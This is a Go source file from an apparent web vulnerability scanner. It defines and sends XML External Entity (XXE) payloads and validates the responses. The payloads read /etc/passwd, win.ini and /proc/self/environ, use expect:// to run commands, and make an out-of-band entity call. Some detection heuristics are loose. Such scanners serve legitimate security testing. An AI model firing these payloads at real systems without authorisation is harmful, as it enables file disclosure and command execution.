package scanner

import (
	"context"
	"fmt"
	"regexp"
	"strings"

	"github.com/GhostN3xus/Huntsuite/pkg/logging"
)

// XXE Scanner - XML External Entity Injection Detection
// This module performs REAL validation by attempting to read system files through XXE

// getXXEPayloads returns XXE payloads for testing
func getXXEPayloads(marker string) []string {
	return []string{
		// Classic XXE - /etc/passwd
		`<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>`,

		// XXE with different file targets
		`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo><bar>&xxe;</bar></foo>`,

		// XXE - Windows
		`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<foo>&xxe;</foo>`,

		// XXE with PHP wrapper
		`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
<foo>&xxe;</foo>`,

		// XXE - /etc/hosts
		`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
<foo>&xxe;</foo>`,

		// Parameter Entity XXE
		`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]>
<foo>test</foo>`,

		// XXE with expect (if expect module is loaded)
		`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<foo>&xxe;</foo>`,

		// XXE - data wrapper
		fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain;base64,%s">]>
<foo>&xxe;</foo>`, marker),

		// XXE with error-based detection
		`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">]>
<foo>&xxe;</foo>`,

		// Billion Laughs Attack (for detection only, limited)
		`<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>`,

		// UTF-7 encoded XXE
		`+ADw?xml version+AD0AIgA1.0+ACI encoding+AD0AIgBVAFQARgAtADcAIg?+
+ADw!DOCTYPE foo+AFs
+ADw!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI+AD4
+AF0+AD4
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4`,

		// XXE with namespaces
		`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo xmlns="http://test.com">
  <bar>&xxe;</bar>
</foo>`,

		// XXE with CDATA
		`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo><![CDATA[&xxe;]]></foo>`,

		// Blind XXE with OOB marker
		fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY %%xxe SYSTEM "http://%s/">%%xxe;]>
<foo>test</foo>`, marker),

		// XXE - /proc/self/environ
		`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]>
<foo>&xxe;</foo>`,
	}
}

// scanXXE performs XXE (XML External Entity) scanning with REAL validation
func (e *Engine) scanXXE(ctx context.Context, target string, points []injectionPoint, opts Options) error {
	if !opts.EnableXXE {
		return nil
	}

	e.logger.Info("starting XXE scan", logging.Fields{
		"target": target,
		"points": len(points),
	})

	// Generate unique marker for OOB detection
	marker := generateUniqueMarker()
	if opts.OOBDomain != "" {
		marker = opts.OOBDomain
	}

	payloads := getXXEPayloads(marker)

	for _, point := range points {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		// XXE is typically exploited through POST requests with XML content
		// Skip if not a POST/PUT method or doesn't accept XML
		if point.Method != "POST" && point.Method != "PUT" {
			continue
		}

		for _, payload := range payloads {
			select {
			case <-ctx.Done():
				return ctx.Err()
			default:
			}

			// Create request with XXE payload
			req := point.templateForValue(payload)

			// Override content type to XML
			if req.Headers == nil {
				req.Headers = make(map[string][]string)
			}
			req.Headers.Set("Content-Type", "application/xml")
			req.Body = []byte(payload)

			// Send request
			resp, err := e.executeRequest(ctx, req, opts)
			if err != nil {
				continue
			}

			// Perform REAL validation
			if e.validateXXE(payload, marker, resp) {
				finding := Finding{
					Title:       "XML External Entity (XXE) Injection",
					Type:        "XXE",
					Severity:    SeverityHigh,
					Description: fmt.Sprintf("XXE vulnerability detected in %s. The application parses XML with external entity processing enabled, allowing file disclosure and SSRF attacks.", point.label()),
					Evidence:    fmt.Sprintf("Payload: %s\nResponse contained system file content or XXE indicators.", truncateString(payload, 200)),
					PoC: fmt.Sprintf("curl -X %s '%s' \\\n  -H 'Content-Type: application/xml' \\\n  -d '%s'\n\nThe response contains system file content, confirming XXE vulnerability.",
						req.Method, req.URL, truncateString(payload, 200)),
				}

				e.reportFinding(ctx, finding, point, req, resp)

				e.logger.Warn("XXE vulnerability found", logging.Fields{
					"severity": string(finding.Severity),
					"type":     finding.Type,
					"target":   req.URL,
				})

				// Found vulnerability, move to next point
				break
			}
		}
	}

	e.logger.Info("XXE scan completed", logging.Fields{"target": target})
	return nil
}

// validateXXE performs REAL validation by checking for file content in response
func (e *Engine) validateXXE(payload string, marker string, resp responsePayload) bool {
	body := string(resp.Body)
	bodyLower := strings.ToLower(body)

	// Check if response is empty or error
	if resp.StatusCode != 200 || len(body) == 0 {
		// Some XXE might return error codes with content
		if resp.StatusCode >= 400 && resp.StatusCode < 600 {
			// Check for XXE error messages
			if strings.Contains(bodyLower, "external entity") ||
				strings.Contains(bodyLower, "entity") ||
				strings.Contains(bodyLower, "dtd") ||
				strings.Contains(bodyLower, "xml") {
				return true
			}
		}
		return false
	}

	// 1. Check for /etc/passwd content
	if strings.Contains(payload, "/etc/passwd") {
		passwdPatterns := []string{
			`root:.*:0:0:`,
			`root:x:0:0:`,
			`bin:.*:1:1:`,
			`daemon:.*:2:2:`,
			`/bin/bash`,
			`/bin/sh`,
			`/sbin/nologin`,
		}

		for _, pattern := range passwdPatterns {
			matched, _ := regexp.MatchString(pattern, body)
			if matched {
				e.logger.Debug("XXE - /etc/passwd content detected", logging.Fields{
					"pattern": pattern,
				})
				return true
			}
		}
	}

	// 2. Check for /etc/hosts content
	if strings.Contains(payload, "/etc/hosts") {
		if (strings.Contains(body, "127.0.0.1") && strings.Contains(body, "localhost")) ||
			strings.Contains(body, "::1") {
			e.logger.Debug("XXE - /etc/hosts content detected", logging.Fields{})
			return true
		}
	}

	// 3. Check for Windows files (win.ini)
	if strings.Contains(payload, "win.ini") {
		winPatterns := []string{
			`\[fonts\]`,
			`\[extensions\]`,
			`\[files\]`,
			`for 16-bit app support`,
		}

		for _, pattern := range winPatterns {
			matched, _ := regexp.MatchString(pattern, body)
			if matched {
				e.logger.Debug("XXE - win.ini content detected", logging.Fields{
					"pattern": pattern,
				})
				return true
			}
		}
	}

	// 4. Check for /proc/self/environ
	if strings.Contains(payload, "environ") {
		if strings.Contains(body, "PATH=") || strings.Contains(body, "HOME=") ||
			strings.Contains(body, "USER=") {
			e.logger.Debug("XXE - environment variables detected", logging.Fields{})
			return true
		}
	}

	// 5. Check for PHP file content (base64 encoded)
	if strings.Contains(payload, "php://filter") && strings.Contains(payload, "base64") {
		// Check if response contains base64-like content
		base64Pattern := `[A-Za-z0-9+/]{40,}={0,2}`
		matched, _ := regexp.MatchString(base64Pattern, body)
		if matched {
			e.logger.Debug("XXE - base64 encoded content detected", logging.Fields{})
			return true
		}
	}

	// 6. Check for command output (expect://)
	if strings.Contains(payload, "expect://") {
		commandPatterns := []string{
			`uid=\d+`,
			`gid=\d+`,
			`groups=`,
		}

		for _, pattern := range commandPatterns {
			matched, _ := regexp.MatchString(pattern, body)
			if matched {
				e.logger.Debug("XXE - command output detected", logging.Fields{
					"pattern": pattern,
				})
				return true
			}
		}
	}

	// 7. Check for our OOB marker
	if strings.Contains(body, marker) {
		e.logger.Debug("XXE - OOB marker detected", logging.Fields{
			"marker": marker,
		})
		return true
	}

	// 8. Check for XML parsing errors that indicate XXE attempt was processed
	xxeErrorPatterns := []string{
		"external entity",
		"entity.*not.*defined",
		"entity.*reference",
		"xml.*parsing.*error",
		"dtd.*prohibited",
		"entity.*forbidden",
		"external.*dtd",
		"system.*identifier",
	}

	for _, pattern := range xxeErrorPatterns {
		matched, _ := regexp.MatchString("(?i)"+pattern, body)
		if matched {
			e.logger.Debug("XXE - parsing error detected", logging.Fields{
				"pattern": pattern,
			})
			return true
		}
	}

	// 9. Heuristic: if response significantly changed with XXE payload
	// and contains typical file content patterns
	if len(body) > 500 {
		fileContentIndicators := []string{
			":",
			"/",
			"\\",
			"\n",
		}

		score := 0
		for _, indicator := range fileContentIndicators {
			if strings.Count(body, indicator) > 5 {
				score++
			}
		}

		if score >= 3 {
			e.logger.Debug("XXE - heuristic detection (file-like content)", logging.Fields{
				"score": score,
			})
			return true
		}
	}

	return false
}
